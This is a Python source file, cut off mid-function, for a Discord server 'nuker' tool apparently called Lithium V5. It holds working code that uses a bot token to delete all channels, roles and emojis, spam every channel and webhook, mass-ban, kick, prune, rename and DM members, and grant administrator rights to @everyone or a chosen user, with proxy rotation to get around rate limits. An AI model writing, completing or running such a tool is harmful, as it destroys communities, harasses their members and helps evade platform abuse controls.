import os
import time
import json
import httpx
import ctypes
import random
import base64
import asyncio
import requests
import keyboard
import threading
import subprocess
import concurrent.futures
from .logger import Logger
from concurrent.futures import ThreadPoolExecutor, as_completed, wait




logger = Logger(format="horizontal")


class HTTP2Session:
    def __init__(self, proxyless=True):
        self.proxyless = proxyless
        self.client = httpx.Client(http2=True, timeout=20.0)
        if not self.proxyless:
            self.set_proxies()
        self.terminated = False
        logger.dbg("Initialized http2 sesh")

    def set_proxies(self):
        try:
            if not self.proxyless:
                proxy = random.choice(open("db/proxies.txt", "r").read().splitlines())
                self.client.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        except Exception as e:
            pass

    def _sync_request(self, method, url, **kwargs):
        if self.terminated:
            return None
        async def async_request():
            async with httpx.AsyncClient(http2=True) as async_client:
                response = await async_client.request(method, url, **kwargs)
                if response.status_code == 429 and not self.proxyless:
                    self.set_proxies()
                return response

        return asyncio.run(async_request())

    def get(self, url, **kwargs):
        return self._sync_request("GET", url, **kwargs)

    def post(self, url, **kwargs):
        return self._sync_request("POST", url, **kwargs)

    def delete(self, url, **kwargs):
        return self._sync_request("DELETE", url, **kwargs)

    def put(self, url, **kwargs):
        return self._sync_request("PUT", url, **kwargs)

    def patch(self, url, **kwargs):
        return self._sync_request("PATCH", url, **kwargs)

    def close(self):
        self.client.close()


class HTTPSESSION:
    def __init__(self, proxyless=True):
        self.proxyless = proxyless
        self.session = requests.Session()
        self.terminated = False
        if not self.proxyless:
            self.set_proxies()

        logger.dbg("Initialized http sesh")

    def set_proxies(self):
        try:
            if not self.proxyless:
                proxy = random.choice(open("db/proxies.txt", "r").read().splitlines())
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        except Exception as e:
            pass

    def _sync_request(self, method, url, **kwargs):
        if self.terminated:
            return None
        response = self.session.request(method, url, **kwargs)
        if response.status_code == 429 and not self.proxyless:
            self.set_proxies()
            response = self.session.request(method, url, **kwargs)
        return response

    def get(self, url, **kwargs):
        return self._sync_request("GET", url, **kwargs)

    def post(self, url, **kwargs):
        return self._sync_request("POST", url, **kwargs)

    def delete(self, url, **kwargs):
        return self._sync_request("DELETE", url, **kwargs)

    def put(self, url, **kwargs):
        return self._sync_request("PUT", url, **kwargs)

    def patch(self, url, **kwargs):
        return self._sync_request("PATCH", url, **kwargs)

    def close(self):
        self.session.close()

class Nuker:
    def __init__(self, token, guild, proxyless=True, threads=5, webhook="LMAO", whitelist=[], http2=False):
        self.token = token
        self.guild = guild
        self.proxyless = proxyless
        self.threads = threads
        if http2:
            self.session = HTTP2Session()
        else:
            self.session = HTTPSESSION()

        self.headers = {
            "Authorization": f"Bot {self.token}",
        }
        self.everyone = self._fetch_everyone_rid()
        self.webhook = webhook
        self.whitelist = whitelist
        self.finished = False
        self.proxy()

    def proxy(self):
        try:
            if not self.proxyless:
                proxy = random.choice(open("db/proxies.txt", "r").read().splitlines())
                self.session.proxies.update({"http": f"http://{proxy}", "https": f"http://{proxy}"})
        except Exception as e:
            pass


    def _fetch_everyone_rid(self):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/roles"
        response = self.session.get(url, headers=self.headers)

        if response.status_code in [200, 204]:
            roles = response.json()
            for role in roles:
                if role['name'] == '@everyone':
                    return role['id']
        else:
            logger.err(f"Failed to fetch roles", response=response.text, code=response.status_code)
        return None

    def run(self, func, times, *args):
        self.finished = False
        self.session.terminated = False
        def wrapper(i):
            return func(*args)

        def check():
            while self.session.terminated == False and self.finished == False:
                if keyboard.is_pressed('esc'):
                    self.session.terminated = True
                    ctypes.windll.kernel32.SetConsoleTitleW("Lithium | V5 | Terminating Current Task                   [discord.gg/pop]")
                    print("")
                    logger.inf("Terminating tasks, can take a while")
                time.sleep(0.1)

        kt = threading.Thread(target=check, daemon=True)
        kt.start()

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(wrapper, i) for i in range(times)]
            for future in concurrent.futures.as_completed(futures):
                if self.session.terminated:
                    for fut in futures:
                        fut.cancel()
                    break
                try:
                    result = future.result()
                except concurrent.futures.CancelledError:
                    logger.inf("Task was cancelled")
                except Exception as e:
                    logger.err(f"An error occurred {e}")
                # -- idk, do something w the result lmao
        self.finished = True

    def CreateChannel(self, name):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/channels"
        payload = {
            "name": name,
            "type": 0
        }

        response = self.session.post(url, json=payload, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            id = response.json()['id']
            logger.inf(f"Channel created successfully", id=id)

        elif response.status_code == 429:
            logger.wrn(f"Got rate limit response while creating channel")

        elif response.status_code == 403:
            logger.err(f"Bot does not have permissions to create channels")

        else:
            logger.err(f"Failed to create channel", response=response.text, code=response.status_code)

    def DeleteChannel(self, chn):
        url = f"https://discord.com/api/v10/channels/{chn}"

        response = self.session.delete(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204]:
            logger.inf(f"Channel deleted successfully", id=chn)
        elif response.status_code == 429:
            logger.wrn(f"Got rate limit response while deleting channel")
        elif response.status_code == 403:
            logger.err(f"Bot does not have permissions to delete channels")
        else:
            logger.err(f"Failed to delete channel", response=response.text, code=response.status_code)

    def DeleteAllChannels(self):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/channels"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None


        if response.status_code in [200, 204]:
            channels = response.json()
            chns = [channel['id'] for channel in channels]

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.DeleteChannel, chn): chn for chn in chns}

                for future in as_completed(futures):
                    chn = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        logger.err(f"Error deleting channel", id=str(chn), error=str(e))
        else:
            logger.err(f"Failed to get channels", response=response.text, code=response.status_code)



    def LockChannel(self, chn):
        if not self.everyone:
            logger.err("Failed to lock channel; @everyone role ID not found.")
            return

        url = f"https://discord.com/api/v10/channels/{chn}/permissions/{self.everyone}"
        payload = {
            "deny": "1024"
        }

        response = self.session.put(url, json=payload, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204]:
            logger.inf(f"Channel {chn} locked successfully")
        elif response.status_code == 429:
            logger.wrn(f"Rate limit response while locking channel {chn}")
        elif response.status_code == 403:
            logger.err(f"Bot does not have permissions to lock channel {chn}")
        else:
            logger.err(f"Failed to lock channel {chn}", response=response.text, code=response.status_code)

    def UnlockChannel(self, chn):
        if not self.everyone:
            logger.err("Failed to unlock channel; @everyone role ID not found.")
            return

        url = f"https://discord.com/api/v10/channels/{chn}/permissions/{self.everyone}"
        payload = {
            "allow": "1024"
        }

        response = self.session.put(url, json=payload, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204]:
            logger.inf(f"Channel {chn} unlocked successfully")
        elif response.status_code == 429:
            logger.wrn(f"Rate limit response while unlocking channel {chn}")
        elif response.status_code == 403:
            logger.err(f"Bot does not have permissions to unlock channel {chn}")
        else:
            logger.err(f"Failed to unlock channel {chn}", response=response.text, code=response.status_code)

    def LockAllChannels(self):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/channels"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204]:
            channels = response.json()
            chns = [channel['id'] for channel in channels]

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.LockChannel, chn) for chn in chns]

                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        logger.err(f"An error occurred while locking channel", error=str(e))
        else:
            logger.err(f"Failed to get channels", response=response.text, code=response.status_code)

    def UnlockAllChannels(self):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/channels"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204]:
            channels = response.json()
            chns = [channel['id'] for channel in channels]

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.UnlockChannel, chn) for chn in chns]

                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        logger.err(f"An error occurred while unlocking channel", error=str(e))
        else:
            logger.err(f"Failed to get channels", response=response.text, code=response.status_code)



    def RenameChannel(self, chn, new):
        url = f"https://discord.com/api/v10/channels/{chn}"
        payload = {
            "name": new
        }

        response = self.session.patch(url, json=payload, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            logger.inf(f"Channel {chn} renamed successfully")
        elif response.status_code == 429:
            logger.wrn(f"Rate limit response while renaming channel {chn}")
        elif response.status_code == 403:
            logger.err(f"Bot does not have permissions to rename channel {chn}")
        else:
            logger.err(f"Failed to rename channel {chn}", response=response.text, code=response.status_code)

    def RenameAllChannels(self, new):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/channels"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            channels = response.json()
            chns = [channel['id'] for channel in channels]

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.RenameChannel, chn, new): chn for chn in chns}

                for future in as_completed(futures):
                    chn = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        logger.err(f"Error renaming channel", id=str(chn), error=str(e))
        else:
            logger.err(f"Failed to get channels", response=response.text, code=response.status_code)

    def SendMessage(self, chn, message, amt):
        url = f"https://discord.com/api/v10/channels/{chn}/messages"
        payload = {
            "content": message
        }

        def send():
            response = self.session.post(url, json=payload, headers=self.headers)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                logger.inf(f"Message sent to channel {chn}")
            elif response.status_code == 429:
                logger.wrn(f"Rate limit response while sending message to channel {chn}")
            elif response.status_code == 403:
                logger.err(f"Bot does not have permissions to send messages to channel {chn}")
            else:
                logger.err(f"Failed to send message to channel {chn}", response=response.text, code=response.status_code)

        with ThreadPoolExecutor(max_workers=2) as executor:
            futures = [executor.submit(send) for _ in range(amt)]
            wait(futures)

    def Spam(self, message, amt):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/channels"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            channels = response.json()
            chns = [channel['id'] for channel in channels]
            if chns == 0:
                logger.wrn("No channels found")
                return
            def send_to_channel(chn):
                self.SendMessage(chn, message, amt)

            with ThreadPoolExecutor(max_workers=len(chns)) as executor:
                futures = {executor.submit(send_to_channel, chn): chn for chn in chns}

                for future in as_completed(futures):
                    chn = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        logger.err(f"Error sending message to channel", id=str(chn), error=str(e))

        else:
            logger.err(f"Failed to get channels", response=response.text, code=response.status_code)



    def GetWH(self, chn):
        url = f"https://discord.com/api/v10/channels/{chn}/webhooks"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            webhooks = response.json()
            for webhook in webhooks:
                if webhook['name'] == self.webhook:
                    return webhook['url']
            
            payload = {
                "name": self.webhook
            }
            response = self.session.post(url, json=payload, headers=self.headers)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                logger.inf("Created webhook in", channel=chn)
                return response.json()['url']
            else:
                logger.err(f"Failed to create webhook in channel {chn}", response=response.text, code=response.status_code)
                return None
        else:
            logger.err(f"Failed to get webhooks for channel {chn}", response=response.text, code=response.status_code)
            return None

    def SendMessageWH(self, wburl, message, amount):
        payload = {
            "content": message
        }
        for _ in range(amount):
            response = self.session.post(wburl, json=payload)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                logger.inf(f"Message sent to webhook")
            elif response.status_code == 429:
                logger.wrn(f"Rate limit response while sending message to webhook")
            else:
                logger.err(f"Failed to send message to webhook", response=response.text, code=response.status_code)

    def SpamWH(self, message, amount):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/channels"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            channels = response.json()
            chns = [channel['id'] for channel in channels]

            def process_channel(chn):
                wburl = self.GetWH(chn)
                if wburl:
                    self.SendMessageWH(wburl, message, amount)

            with ThreadPoolExecutor(max_workers=len(chns)) as executor:
                futures = {executor.submit(process_channel, chn): chn for chn in chns}

                for future in as_completed(futures):
                    chn = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        logger.err(f"Error in channel", id=str(chn), error=str(e))
        else:
            logger.err(f"Failed to get channels", response=response.text, code=response.status_code)



    def CreateRoles(self, name, count):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/roles"

        def create_role(index):
            payload = {
                "name": f"@ {name}",
                "permissions": 0,
                "color": 0,
                "hoist": True,
                "mentionable": False
            }
            response = self.session.post(url, json=payload, headers=self.headers)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                rid = response.json()['id']
                logger.inf(f"Role created successfully", id=rid)
            elif response.status_code == 429:
                logger.wrn(f"Rate limit response while creating role")
            else:
                logger.err(f"Failed to create role", response=response.text, code=response.status_code)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(create_role, i) for i in range(count)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.err(f"Error creating role", error=str(e))


    def DeleteAllRoles(self):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/roles"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            roles = response.json()
            rids = [role['id'] for role in roles if role['id'] != "@everyone" and not role['managed']]

            def delete_role(rid):
                delUrl = f"https://discord.com/api/v9/guilds/{self.guild}/roles/{rid}"
                response = self.session.delete(delUrl, headers=self.headers)
                if response == None:
                    return None

                if response.status_code in [200, 204, 201]:
                    logger.inf(f"Role deleted successfully", id=rid)
                elif response.status_code == 429:
                    logger.wrn(f"Rate limit response while deleting role")
                else:
                    logger.err(f"Failed to delete role", response=response.text, code=response.status_code)

            with ThreadPoolExecutor(max_workers=len(rids)) as executor:
                futures = {executor.submit(delete_role, rid): rid for rid in rids}

                for future in as_completed(futures):
                    rid = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        logger.err(f"Error deleting role", id=str(rid), error=str(e))
        else:
            logger.err(f"Failed to get roles", response=response.text, code=response.status_code)



    def GrantRole(self, user, role):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/members/{user}/roles/{role}"
        response = self.session.put(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            logger.inf(f"Role granted successfully", user=user, role=role)
        elif response.status_code == 429:
            logger.wrn(f"Rate limit response while granting role")
        else:
            logger.err(f"Failed to grant role", response=response.text, code=response.status_code)




    def Admin(self, uid):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/roles"

        payload = {
            "name": ".",
            "permissions": 8,
            "color": 0,
            "hoist": False,
            "mentionable": False
        }
        response = self.session.post(url, json=payload, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            rid = response.json()['id']
            logger.inf(f"Admin role created successfully", rid=rid)

            self.GrantRole(uid, rid)

        elif response.status_code == 429:
            logger.wrn(f"Rate limit response while creating role")
        else:
            logger.err(f"Failed to create role", response=response.text, code=response.status_code)



    def EAdmin(self):
        if not self.everyone:
            logger.err("Failed to unlock channel; @everyone role ID not found.")
            return
        url = f"https://discord.com/api/v10/guilds/{self.guild}/roles"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            payload = {
                "permissions": 8
            }
            response = self.session.patch(f"{url}/{self.everyone}", json=payload, headers=self.headers)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                logger.inf(f"Gave admin to @everyone role")
            elif response.status_code == 429:
                logger.wrn(f"Rate limit response while giving admin to @everyone")
            else:
                logger.err(f"Failed to give admin to @everyone", response=response.text, code=response.status_code)
        else:
            logger.err(f"Failed to get roles", response=response.text, code=response.status_code)



    def MassBan(self, bids=False):
        self.MassPrune()
        url = f"https://discord.com/api/v10/guilds/{self.guild}/members"
        headers = {
            "Authorization": f"Bot {self.token}"
        }
        chk = 1000
        mids = []
        if bids == False:
            params = {
                "limit": chk
            }
            logger.inf("Scraping members")
            while True:
                response = requests.get(url, headers=headers, params=params)
                if response.status_code in [200, 204, 201]:
                    md = response.json()
                    mids.extend([member['user']['id'] for member in md])
                    logger.dbg("Scraped members", amount=len(mids))
                    if len(md) < chk:
                        break
                    else:
                        params['after'] = md[-1]['user']['id']
                else:
                    logger.err(f"Error fetching members: {response.status_code}")
                    break
        else:
            try:
                with open("db/ids.txt", 'r') as f:
                    mids.extend(f.read().splitlines())
            except FileNotFoundError:
                logger.err("db/ids.txt no exist :c, not able to ban ids.")

        def banmem(mid):
            if mid in self.whitelist:
                logger.inf("Skipping ban for", user=mid)
                return
            banUrl = f"https://discord.com/api/v10/guilds/{self.guild}/bans/{mid}"
            response = self.session.put(banUrl, headers=self.headers, json={"delete_message_days": random.randint(0, 7)})
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                logger.inf(f"Member {mid} banned")
            elif response.status_code == 429:
                logger.wrn(f"Rate limit response while banning member {mid}")
            elif response.status_code == 403:
                logger.wrn(f"Missing perms to ban {mid}")
            else:
                logger.err(f"Failed to ban {mid}", response=response.text, code=response.status_code)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(banmem, mid) for mid in mids]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.err(f"Error banning member", error=str(e))


    def MassKick(self, bids=False):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/members"
        headers = self.headers
        chk = 1000
        mids = []

        if not bids:
            params = {
                "limit": chk
            }
            logger.inf("Scraping members")
            while True:
                response = requests.get(url, headers=headers, params=params)
                if response.status_code in [200, 204, 201]:
                    md = response.json()
                    mids.extend([member['user']['id'] for member in md])
                    logger.dbg("Scraped members", amount=len(mids))
                    if len(md) < chk:
                        break
                    else:
                        params['after'] = md[-1]['user']['id']
                else:
                    logger.err(f"Error fetching members: {response.status_code}")
                    break
        else:
            try:
                with open("db/ids.txt", 'r') as f:
                    mids.extend(f.read().splitlines())
            except FileNotFoundError:
                logger.err("db/ids.txt does not exist, not able to kick ids.")

        def kickm(mid):
            if mid in self.whitelist:
                logger.inf("Skipping kick for", user=mid)
                return
            ku = f"https://discord.com/api/v10/guilds/{self.guild}/members/{mid}"
            response = self.session.delete(ku, headers=self.headers)
            if response == None:
                return None


            if response.status_code in [200, 204, 201]:
                logger.inf(f"Member {mid} kicked")
            elif response.status_code == 429:
                logger.wrn(f"Rate limit response while kicking member {mid}")
            elif response.status_code == 403:
                logger.wrn(f"Missing permissions to kick {mid}")
            else:
                logger.err(f"Failed to kick {mid}", response=response.text, code=response.status_code)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(kickm, mid) for mid in mids]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.err(f"Error kicking member", error=str(e))


    def MassPrune(self, days=1):
        payload = {"days": days}
        url = f"https://discord.com/api/v10/guilds/{self.guild}/prune"
        headers = {"Authorization": f"Bot {self.token}"}

        response = self.session.post(url, headers=headers, json=payload)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            pruned_count = response.json().get('pruned', 0)
            logger.inf(f"Pruned {pruned_count} members")
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            retry_after = response.json().get('retry_after', 0)
            logger.wrn(f"Prune failed, try again in {retry_after}s", resp=response.status_code)

        else:
            logger.err(f"An error occurred during pruning", resp=response.status_code)

    def MassNick(self, new):
        def fetch():
            logger.inf("Scraping members")
            url = f"https://discord.com/api/v10/guilds/{self.guild}/members"
            params = {"limit": 1000}
            mids = []

            while True:
                response = self.session.get(url, headers=self.headers, params=params)
                if response == None:
                    return None

                if response.status_code in [200, 204, 201]:
                    rjson = response.json()
                    logger.dbg(f"Scraped a chunk of {len(rjson)} user ids")
                    mids.extend(member['user']['id'] for member in rjson if member['user']['id'] not in self.whitelist)
                    if len(rjson) < params["limit"]:
                        break
                    params['after'] = rjson[-1]['user']['id']
                else:
                    logger.err(f"Error fetching members: {response.status_code}")
                    break

            return mids

        def change(uid):
            url = f"https://discord.com/api/v10/guilds/{self.guild}/members/{uid}"
            payload = {"nick": new}
            response = self.session.patch(url, headers=self.headers, json=payload)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                logger.inf(f"nick changed for user {uid}")
            elif response.status_code == 429:
                logger.wrn(f"Rate limited while changing nick for user {uid}")
            elif response.status_code == 403:
                logger.wrn(f"Missing permissions to change nick for user {uid}")
            else:
                logger.err(f"Failed to change nick for user {uid}", response=response.text, code=response.status_code)

        mids = fetch()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(change, uid) for uid in mids]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.err(f"Error changing nick", error=str(e))


    def MassDM(self, message):
        def fetch():
            logger.inf("Scraping members")
            url = f"https://discord.com/api/v10/guilds/{self.guild}/members"
            params = {"limit": 1000}
            mids = []

            while True:
                response = self.session.get(url, headers=self.headers, params=params)
                if response == None:
                    return None

                if response.status_code in [200, 204, 201]:
                    rjson = response.json()
                    mids.extend(member['user']['id'] for member in rjson)
                    if len(rjson) < params["limit"]:
                        break
                    params['after'] = rjson[-1]['user']['id']
                else:
                    logger.err(f"Error fetching members: {response.status_code}")
                    break

            return mids

        def dm(uid):
            durl = f"https://discord.com/api/v10/users/@me/channels"
            dp = {"recipient_id": uid}
            response = self.session.post(durl, headers=self.headers, json=dp)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                cid = response.json()['id']
                murl = f"https://discord.com/api/v10/channels/{cid}/messages"
                mp = {"content": message}
                mr = self.session.post(murl, headers=self.headers, json=mp)
                if response == None:
                    return None

                if mr.status_code == 200:
                    logger.inf(f"Message sent to user {uid}")
                elif mr.status_code == 429:
                    logger.wrn(f"Rate limited while sending message to user {uid}")
                elif mr.status_code == 403:
                    logger.wrn(f"Missing permissions to send DM to user {uid}")
                else:
                    logger.err(f"Failed to send message to user {uid}", response=mr.text, code=mr.status_code)
            elif response.status_code == 429:
                logger.wrn(f"Rate limited while creating DM channel for user {uid}")
            else:
                logger.err(f"Failed to create DM channel for user {uid}", response=response.text, code=response.status_code)

        mids = fetch()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(dm, uid) for uid in mids]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.err(f"Error sending DM", error=str(e))



    def DeleteEmojis(self):
        def fetch():
            logger.inf("Fetching emojis")
            url = f"https://discord.com/api/v10/guilds/{self.guild}/emojis"
            response = self.session.get(url, headers=self.headers)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                emojis = response.json()
                eids = [emoji['id'] for emoji in emojis]
                logger.inf(f"Fetched {len(eids)} emojis")
                return eids
            else:
                logger.err(f"Failed to fetch emojis: {response.status_code}", response=response.text)
                return []

        def delete(eid):
            url = f"https://discord.com/api/v10/guilds/{self.guild}/emojis/{eid}"
            response = self.session.delete(url, headers=self.headers)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                logger.inf(f"Deleted emoji {eid}")
            elif response.status_code == 429:
                logger.wrn(f"Rate limited while deleting emoji {eid}")
            elif response.status_code == 403:
                logger.wrn(f"Missing permissions to delete emoji {eid}")
            else:
                logger.err(f"Failed to delete emoji {eid}", response=response.text, code=response.status_code)

        eids = fetch()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(delete, eid) for eid in eids]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.err(f"Error deleting emoji", error=str(e))


    def CreateEmojis(self, count, name):
        def upload(name):
            url = f"https://discord.com/api/v10/guilds/{self.guild}/emojis"
            payload = {
                "name": name,
                "image": f"data:image/png;base64,{self.imgd}",
            }
            response = self.session.post(url, json=payload, headers=self.headers)
            if response == None:
                return None

            if response.status_code in [200, 204, 201]:
                id = response.json().get('id')
                logger.inf(f"Created emoji", id=id)
            elif response.status_code == 429:
                logger.wrn(f"Rate limited while creating emoji")
            elif response.status_code == 403:
                logger.wrn(f"Missing permissions to create emoji")
            else:
                logger.err(f"Failed to create emoji", response=response.text, code=response.status_code)


        url = logger.inp("Enter file URL for the emoji [PNG/GIF/JPEG/WEBP]: ")
        response = requests.get(url)
        if response.status_code in [200, 204, 201]:
            self.imgd = base64.b64encode(response.content).decode('utf-8')
        else:
            logger.err(f"Failed to download image from {url}", response=response.text, code=response.status_code)
            return


        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(upload, name) for i in range(count)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.err(f"Error creating emoji", error=str(e))


    def RenameServer(self, new):
        url = f"https://discord.com/api/v10/guilds/{self.guild}"
        payload = {
            "name": new
        }
        response = self.session.patch(url, json=payload, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            logger.inf(f"Server name changed to {new}")
        elif response.status_code == 429:
            logger.wrn(f"Rate limit response while changing server name")
        elif response.status_code == 403:
            logger.wrn(f"Missing permissions to change server name")
        else:
            logger.err(f"Failed to change server name", response=response.text, code=response.status_code)

    def LeaveGuild(self):
        url = f"https://discord.com/api/v10/users/@me/guilds/{self.guild}"

        response = requests.delete(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code in [200, 204, 201]:
            logger.inf(f"Successfully left {self.guild}")
        elif response.status_code == 404:
            logger.wrn(f"Server {self.guild} not found")
        else:
            logger.err(f"Failed to leave server {self.guild}", response=response.text, code=response.status_code)


    def LeaveAllGuilds(self):
        url = "https://discord.com/api/v10/users/@me/guilds"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None

        if response.status_code == 200:
            guilds = response.json()
            for guild in guilds:
                guild = guild['id']
                url = f"https://discord.com/api/v9/users/@me/guilds/{guild}"
                response = requests.delete(url, headers=self.headers)
                if response.status_code in [200, 204, 201]:
                    logger.inf(f"Successfully left {guild}")
                elif response.status_code == 404:
                    logger.wrn(f"Server {guild} not found")
                else:
                    logger.err(f"Failed to leave server {guild}", response=response.text, code=response.status_code)
        elif response.status_code == 403:
            logger.wrn("Missing permissions to fetch guilds")
        else:
            logger.err(f"Failed to fetch guilds", response=response.text, code=response.status_code)


    def FullNuke(self):
        pass


    def ServerInfo(self):
        os.makedirs('scrapes', exist_ok=True)

        try:
            server = self.session.get(f"https://discord.com/api/v10/guilds/{self.guild}", headers=self.headers).json()
            roles = self.session.get(f"https://discord.com/api/v10/guilds/{self.guild}/roles", headers=self.headers).json()
            chans = self.session.get(f"https://discord.com/api/v10/guilds/{self.guild}/channels", headers=self.headers).json()
            data = {
                "server": server,
                "roles": roles,
                "channels": chans
            }

            with open(f"scrapes/{self.guild}.json", "w", encoding="utf-8") as file:
                json.dump(data, file, indent=4)
            logger.inf("Got info")
            if os.name == 'nt':
                subprocess.run(["notepad.exe", f"scrapes/{self.guild}.json"])
            else:
                logger.wrn("This function currently supports Windows for opening files with Notepad.")

            logger.inf(f"Scraped data saved to scrapes/{self.guild}.json")

        except requests.exceptions.RequestException as e:
            logger.err(f"Request error occurred: {e}")
        except Exception as e:
            logger.err(f"An error occurred: {e}")


    def GetInviteLink(self):
        try:
            chans = self.session.get(f"https://discord.com/api/v10/guilds/{self.guild}/channels", headers=self.headers)
            chans.raise_for_status()
            chdata = chans.json()

            if chdata:
                chanid = random.choice(chdata)['id']
                logger.inf(f"Using channel {chanid} to create invite.")
            else:
                logger.inf("No channels found, creating a new channel.")
                newchan = {
                    "name": "idk",
                    "type": 0
                }
                newchans = self.session.post(f"https://discord.com/api/v10/guilds/{self.guild}/channels", headers=self.headers, json=newchan)
                newchans.raise_for_status()
                chanid = newchans.json()['id']
                logger.inf(f"Created new channel {chanid} for invite.")

            invdata = {"max_age": 86400, "max_uses": 0}
            invresp = self.session.post(f"https://discord.com/api/v10/channels/{chanid}/invites", headers=self.headers, json=invdata)
            invresp.raise_for_status()
            invcode = invresp.json()['code']
            invlink = f"https://discord.gg/{invcode}"

            logger.inf(f"Invite link created: {invlink}")
            return invlink

        except requests.exceptions.RequestException as e:
            logger.err(f"Request error occurred: {e}")
        except Exception as e:
            logger.err(f"An error occurred: {e}")

    def UnbanUser(self, userid):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/bans/{userid}"

        try:
            resp = self.session.delete(url, headers=self.headers)
            if resp.status_code == 204:
                logger.inf(f"Successfully unbanned user", id=userid)
            elif resp.status_code == 403:
                logger.wrn(f"Missing permissions to unban")
            else:
                logger.err(f"Failed to unban user", response=resp.text, code=resp.status_code)
        except requests.exceptions.RequestException as e:
            logger.err(f"Request error occurred: {e}")
        except Exception as e:
            logger.err(f"An error occurred: {e}")


    def UnbanAll(self):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/bans"
        def unban(userid):
            url = f"https://discord.com/api/v10/guilds/{self.guild}/bans/{userid}"

            try:
                resp = self.session.delete(url, headers=self.headers)
                if resp == None:
                    return None
                if resp.status_code == 204:
                    logger.inf(f"Successfully unbanned", id=userid)

                elif resp.status_code == 403:
                    logger.wrn(f"Missing permissions to unban", id=userid)
                elif resp.status_code == 429:
                    logger.wrn(f"Got rate limit while trying to unban", id=userid)

                else:
                    logger.err(f"Failed to unban user", response=resp.text, code=resp.status_code, id=userid)
            except requests.exceptions.RequestException as e:
                logger.err(f"Request error occurred: {e}", id=userid)
            except Exception as e:
                logger.err(f"An error occurred: {e}", id=userid)
        try:
            resp = self.session.get(url, headers=self.headers)
            if resp == None:
                return None
            if resp.status_code == 200:
                bans = resp.json()
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
